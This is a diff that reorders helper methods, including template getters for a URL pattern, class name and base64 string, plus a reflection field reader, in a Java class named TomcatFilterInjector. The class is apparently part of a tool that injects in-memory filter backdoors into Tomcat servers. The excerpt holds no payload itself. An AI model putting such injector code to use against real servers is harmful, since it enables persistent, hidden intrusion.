@@ -36,18 +36,6 @@ public class TomcatFilterInjector {
         }
     }
 
-    public String getUrlPattern() {
-        return "{{urlPattern}}";
-    }
-
-    public String getClassName() {
-        return "{{className}}";
-    }
-
-    public String getBase64String() {
-        return "{{base64Str}}";
-    }
-
     static byte[] decodeBase64(String base64Str) throws Exception {
         Class<?> decoderClass;
         try {
@@ -70,26 +58,6 @@ public class TomcatFilterInjector {
             out.write(buffer, 0, n);
         }
         return out.toByteArray();
-    }
-
-    @SuppressWarnings("all")
-    public Object getFieldValue(Object obj, String name) throws Exception {
-        Field field = null;
-        Class<?> clazz = obj.getClass();
-        while (clazz != Object.class) {
-            try {
-                field = clazz.getDeclaredField(name);
-                break;
-            } catch (NoSuchFieldException var5) {
-                clazz = clazz.getSuperclass();
-            }
-        }
-        if (field == null) {
-            throw new NoSuchFieldException(name);
-        } else {
-            field.setAccessible(true);
-            return field.get(obj);
-        }
     }
 
     public static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
@@ -135,6 +103,38 @@ public class TomcatFilterInjector {
             } catch (IllegalAccessException e) {
                 throw new RuntimeException(e.getMessage());
             }
+        }
+    }
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() {
+        return "{{base64Str}}";
+    }
+
+    @SuppressWarnings("all")
+    public Object getFieldValue(Object obj, String name) throws Exception {
+        Field field = null;
+        Class<?> clazz = obj.getClass();
+        while (clazz != Object.class) {
+            try {
+                field = clazz.getDeclaredField(name);
+                break;
+            } catch (NoSuchFieldException var5) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        if (field == null) {
+            throw new NoSuchFieldException(name);
+        } else {
+            field.setAccessible(true);
+            return field.get(obj);
         }
     }
 
